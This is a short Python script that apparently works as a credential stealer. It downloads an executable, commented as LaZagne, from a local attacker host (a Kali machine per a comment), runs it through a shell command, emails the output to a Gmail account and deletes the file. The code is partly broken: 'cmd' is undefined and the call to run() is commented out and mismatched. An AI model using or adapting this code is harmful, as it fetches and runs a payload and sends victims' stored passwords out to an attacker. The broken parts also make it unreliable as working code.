import subprocess, smtplib, requests, os, tempfile


def dl(url):
    get = requests.get(url)
    #print(get.content)
    fileName = url.split('/')
    #print(fileName[-1])
    with open(fileName[-1],'wb') as of:
        of.write(get.content)

def sendMail(email,password,message):
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


def run():
    tempDir = tempfile.gettempdir()
    os.chdir(tempDir)
    dl('http://10.0.0.214/files/happyFile.exe') # file for the lazagne.exe 
    result = subprocess.check_output(cmd,shell=True)
    sendMail('benpro4433@gmail.com','APPPASS',result)
    os.remove('happyFile.exe')
#must enter IP manually for kali beforehand, or could also pull url from its github release source
#run('happyFile.exe all')








